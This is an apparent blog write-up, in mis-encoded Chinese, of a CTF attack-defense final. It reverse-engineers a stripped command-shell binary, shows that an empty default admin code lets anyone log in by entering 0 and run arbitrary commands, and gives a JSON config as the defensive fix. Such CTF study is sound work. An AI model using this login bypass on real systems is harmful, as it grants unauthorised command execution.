<h1 id="æ€»å†³èµ›"><a href="#æ€»å†³èµ›" class="headerlink" title="æ€»å†³èµ›"></a>æ€»å†³èµ›</h1><p>æ€»å†³èµ›æ›´æ˜¯ğŸ”å§ï¼Œpwnä¸€ä¸ªè‡ªå®ç°çš„å †ç®¡ç†æœºåˆ¶ï¼ŒğŸ‘´ğŸ»ğŸšªæœ¬åœ°å®Œç¾patchæŠ¥æœåŠ¡å¼‚å¸¸ï¼Œä¸€ä¸ªgoå†™çš„é™æ€ç¼–è¯‘ç¬¦å·å…¨å»ï¼Œæ‰¬äº†å‘½ä»¤æ‰§è¡Œpatchä¸è¿‡ï¼Œä¸€ä¸ªçœ‹èµ·æ¥åƒæ˜¯jsonè§£æå·¥å…·ï¼Œä½†æ˜¯ğŸ‘´ğŸ»ğŸšªåˆ†æåˆ°æœ€åå°±åˆ†æä¸å‡ºæ¥äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªhttpæŠ¥æ–‡è§£æå·¥å…·ï¼Œæ²¡çœ‹ã€‚</p>
<p>æ•°æ®åˆ†æå››ä¸ªå–è¯ï¼ŒğŸ‘´ğŸ»ğŸšªæ²¡æœ‰å·¥å…·ã€‚è¿˜æœ‰å››ä¸ªè‹¥æ™ºPHPæµé‡é¢˜ï¼Œæ²¡å•¥æŠ€æœ¯å«é‡ã€‚</p>
<p>åˆ†æä¸€ä¸‹é‚£ä¸ªçœ‹èµ·æ¥åƒæ˜¯jsonè§£æå·¥å…·çš„é¢˜ï¼Œé‚£ä¸ªæœ€éš¾ã€‚</p>
<h2 id="sshell"><a href="#sshell" class="headerlink" title="sshell"></a>sshell</h2><p>é¢˜ç›®è¦æ±‚ä¸èƒ½patchæºç¨‹åºï¼Œè€Œæ˜¯æ”¹é…ç½®æ–‡ä»¶ï¼Œä½†æ˜¯ç»™çš„æœåŠ¡å™¨ä¸Šå¹¶æ²¡æœ‰é…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨é€†å‘ï¼Œæ¥ç»™ä»–æ•´å‡ºæ¥ä¸€ä»½å®‰å…¨çš„é…ç½®æ–‡ä»¶ã€‚</p>
<p>åˆæ˜¯å»ç¬¦å·çš„é¢˜ï¼Œå½³äºï¼Œé«˜è´µçš„macç”¨æˆ·åªèƒ½ç”¨å…è´¹ç‰ˆidaï¼Œæ•´ä¸åˆ°é«˜ç‰ˆæœ¬çš„ç ´è§£ç‰ˆidaï¼Œbindiffåœ¨7.0çš„æ”¯æŒä¸å¥½ä½¿ï¼Œåªèƒ½å—¯é€†äº†</p>
<p><img src="https://s2.loli.net/2023/09/17/K4XqodTOBf9ziSp.png" alt=""></p>
<p>æ‰§è¡Œä¸‹ç¨‹åºï¼Œå‘ç°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/HLOMl8ASrB7vwXV.png" alt=""></p>
<p>æœæœå­—ç¬¦ä¸²ï¼Œå®šä½ä¸‹mainå‡½æ•°ï¼š</p>
<p>é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/sSBouWUmCkQzZ9O.png" alt=""></p>
<p>å‘ç°è°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/8Vd6cqmhDyuHfFt.png" alt=""></p>
<p>ç‚¹è¿›å‡½æ•°ä½“é•¿è¿™æ ·ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/phOiZjfxHgYN4Gt.png" alt=""></p>
<p>ğŸ‘´ğŸ»çŒœè¿™ç©æ„æ˜¯ä¸ªå­—ç¬¦ä¸²å¤„ç†ç›¸å…³çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘å°±æ‰¾ä¸ªlibcæ¥æ¯”å¯¹ä¸€ä¸‹æ²¡æœ‰å»ç¬¦å·çš„å‡½æ•°ï¼Œå‘ç°è¿™ç©æ„åº”è¯¥æ˜¯strtokï¼š</p>
<p><img src="https://s2.loli.net/2023/09/17/4hb8fFpy7vDOjEU.png" alt=""></p>
<p>é€šè¿‡æ¯”å¯¹æ²¡æœ‰å»ç¬¦å·çš„libcåº“å’Œå»æ‰ç¬¦å·çš„é™æ€ç¼–è¯‘çš„ä¸€äº›å‡½æ•°ï¼Œè¿˜æ˜¯å¯ä»¥æ¯”è¾ƒå‡†ç¡®çš„è¿˜åŸå‡ºæ¥å¤§éƒ¨åˆ†åº“å‡½æ•°çš„ï¼Œæ­¤åè¿˜åŸæ‰€éœ€è¦çš„åº“å‡½æ•°æ—¶ä¸å†èµ˜è¿°</p>
<p>ç„¶åå›åˆ°æºç¨‹åºï¼Œè·å–å®Œå‘½ä»¤ä¹‹ååº”è¯¥æ˜¯æ‰§è¡Œå‘½ä»¤æˆ–è€…è§£æå‚æ•°ä¹‹ç±»çš„ï¼Œæ‰€ä»¥ä¸‹é¢ä¸‰ä¸ªå‡½æ•°å¤§æ¦‚å°±æ˜¯æè¿™ä¸ªçš„ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/HZzUEGD6FP5fCbN.png" alt=""></p>
<p>é¦–å…ˆçœ‹sub_401F93å‡½æ•°ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/BWzJMChbKms8qN1.png" alt=""></p>
<p>è¿™ä¸ªä¸œè¥¿ç±»ä¼¼äºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆä¸€æ ·çš„ä¸œè¥¿ï¼Œè¿½ä¸€ä¸‹çœ‹çœ‹ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/7gIDTqLUl1Ce32j.png" alt=""></p>
<p>è¿™äº›å‡½æ•°å¾ˆå¯èƒ½å’Œä¸Šé¢çš„å­—ç¬¦ä¸²å¯¹åº”ï¼Œæ˜¯å¯¹åº”çš„å‡½æ•°ï¼Œåˆ†åˆ«è¿½è¸ªä¸€ä¸‹ï¼Œå¯ä»¥é‡å‘½åä¸€ä¸‹ï¼Œå¾—åˆ°å…·ä½“çš„å‡½æ•°åŠŸèƒ½ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/lLCkMmxijeHR2G6.png" alt=""></p>
<p>æˆ‘ä»¬è¿›ä¸€æ­¥æœç´¢å­—ç¬¦ä¸²ï¼Œå‘ç°adminCodeç­‰å­—ç¬¦ä¸²ï¼Œé€šè¿‡å®šä½å¾—çŸ¥init_arrayè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°è¿›è¡Œäº†åˆå§‹åŒ–ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/yh5XbJZftaUrRDp.png" alt=""></p>
<p>ç»è¿‡æ¨æµ‹æ˜¯æ‰“å¼€ä¸€ä¸ªswordShæ–‡ä»¶ï¼Œç„¶ååšäº†ä¸€äº›æ–‡ä»¶å†…å®¹è¯»å–ç›¸å…³çš„æ“ä½œï¼Œå¹¶ä¸”æ–‡ä»¶ä¸­éœ€è¦æœ‰adminCodeã€badCharç­‰å­—æ®µï¼Œç¼–å†™ä¸€ä¸ªswordShæ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;adminCode&quot;</span>: <span class="string">&quot;aaaaaaaa&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;badChar&quot;</span>: [<span class="string">&quot;bbbbbbbb&quot;</span>, <span class="string">&quot;cccccccc&quot;</span>],</span><br><span class="line">	<span class="attr">&quot;autoLogin&quot;</span>: <span class="string">&quot;dddddddd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åç»è¿‡sub_4040E6çš„å¤„ç†ï¼Œåœ¨å †ç©ºé—´å½¢æˆå¦‚ä¸‹å¸ƒå±€ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/YuRThmwnOKVjEts.png" alt=""></p>
<p>çŒœæµ‹æ­¤å‡½æ•°æ˜¯ç”¨æ¥å°†æ–‡ä»¶çš„é”®å€¼å¯¹åšåŒ¹é…ï¼Œ0x50çš„å †å—å­˜å‚¨æŒ‡é’ˆï¼Œä¸‹é¢çš„å †å—å»å­˜å‚¨å…·ä½“çš„å†…å®¹</p>
<p>åˆ°å¤„ç†badCharå­—æ®µçš„æ—¶å€™ï¼Œä½¿ç”¨å¦‚ä¸‹é€»è¾‘ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/p3kc5F2VW4bvKNT.png" alt=""></p>
<p>é¦–å…ˆè·å–badcharçš„èµ·å§‹æŒ‡é’ˆï¼Œå¹¶ä¸”å…è®¸badcharæœ€å¤šæœ‰å…«ä¸ªæ•°æ®ï¼Œå–å‡ºå¯¹åº”çš„chunkå¹¶ä¸”å­˜å…¥åˆ°æ ˆç©ºé—´çš„æ•°ç»„ä¸­ï¼Œå…¶ä¸­badchar[i] + 0x28æ°å¥½å¯ä»¥ç´¢å¼•åˆ°å¯¹åº”çš„å­—ç¬¦ä¸²ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/NcmBTKYQlvFCnyz.png" alt=""></p>
<p>å¯¹äºautoLoginçš„å¤„ç†å¦‚ä¸‹ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/TdjY5zhZ1Rk73Dn.png" alt=""></p>
<p>å¤§è‡´æ˜¯è·å–autoLoginå­—æ®µï¼Œå¹¶ä¸”æŠŠbadcharæ”¾å…¥åˆ°bssä¸­çš„å˜é‡é‡Œ</p>
<p>ç”±äºåœ¨ç™»å½•æ—¶ä¼šéªŒè¯è¿™ä¸ªå­—æ®µï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/gw6rPHEtaRpcVkI.png" alt=""></p>
<p>å¹¶ä¸”è¿™ä¸ªå­—æ®µåœ¨init_arrayä¸­çš„loaderå‡½æ•°ä¸­è¢«èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…³æ³¨adminCodeè¿™ä¸ªå­—æ®µï¼Œéœ€è¦è¿›è¡Œé…ç½®æ–‡ä»¶çš„æ›´æ”¹ï¼Œä½¿å¾—è¿™ä¸ªå­—æ®µä¸èƒ½é»˜è®¤ä¸ºç©ºï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/X9ngRtqfYo573rS.png" alt=""></p>
<p>é‡ç‚¹å…³æ³¨æ­¤å­—æ®µï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/plGrkgEbFRzjqCP.png" alt=""></p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå­—æ®µä¸ºç©ºï¼Œæ‰€ä»¥å½“ä½¿ç”¨ç¨‹åºçš„ç™»å½•åŠŸèƒ½æ—¶ï¼Œåªéœ€è¾“å…¥0ä¾¿å¯ä»¥æˆåŠŸç™»å½•ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/yGKu4P2fMHJOv6e.png" alt=""></p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ›´æ”¹é…ç½®æ–‡ä»¶ï¼Œä½¿å¾—ç¨‹åºä½¿ç”¨è€…æ— æ³•é€šè¿‡è¾“å…¥0æ¥ç™»å½•</p>
<p>å› ä¸ºç¬¦å·è¡¨å»äº†ï¼Œæ‰€ä»¥é€†å‘å®ƒçš„åˆ†é…ç®—æ³•ååˆ†å›°éš¾ï¼Œç»è¿‡ä¸€é¡¿æ‰‹å·¥æµ‹è¯•ï¼Œå‘ç°å½“adminCodeä¸ºæ•´æ•°æ—¶ï¼Œå¯ä»¥å°†æ­¤å­—æ®µæ”¹æ‰ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/nsN6zPgvM7k3AdV.png" alt=""></p>
<p>æ­¤æ—¶çš„adminå¯†ç å·²ç»è¢«æ”¹ä¸º100ï¼Œå½“è¾“å…¥100æ—¶æ‰å¯ä»¥ç™»å½•æˆåŠŸï¼Œç™»å½•åä¾¿å¯ä»¥æ‰§è¡Œä»»æ„æŒ‡ä»¤ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/18/BRl8m3xfISHOnT7.png" alt=""></p>
<p>æ‰€ä»¥æˆ‘çŒœpatchçš„æ€è·¯å°±æ˜¯æŠŠswordShæ–‡ä»¶ä¸­çš„adminCodeæ”¹æˆä¸€ä¸ªéšæœºæ•°ï¼Œè®©checkè„šæœ¬æ— æ³•ç™»å½•ï¼Œæœ€ç»ˆswordShæ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;adminCode&quot;</span>:<span class="number">100</span>,</span><br><span class="line">	<span class="attr">&quot;badChar&quot;</span>: [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>],</span><br><span class="line">	<span class="attr">&quot;autoLogin&quot;</span>: <span class="string">&quot;fxxk&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯æƒœæ¯”èµ›ç»“æŸäº†ï¼ŒéªŒè¯ä¸äº†äº†</p>
<p>ğŸ‘´ğŸ»å°±æ˜¯ä¸ªğŸ¥¦ğŸ”</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2023/09/16/LJB-2023/">http://example.com/2023/09/16/LJB-2023/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://example.com">Alex's blog~</a>ï¼</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/reverse/">reverse</a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">æµé‡åˆ†æ</a><a class="post-meta__tags" href="/tags/Fix/">Fix</a><a class="post-meta__tags" href="/tags/%E5%8F%96%E8%AF%81/">å–è¯</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2023/09/11/PCTF-wp/"><span>PatriotCTF 2023 write up</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2023 By Alex</div><div class="framework-info"><span>é©±åŠ¨ - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>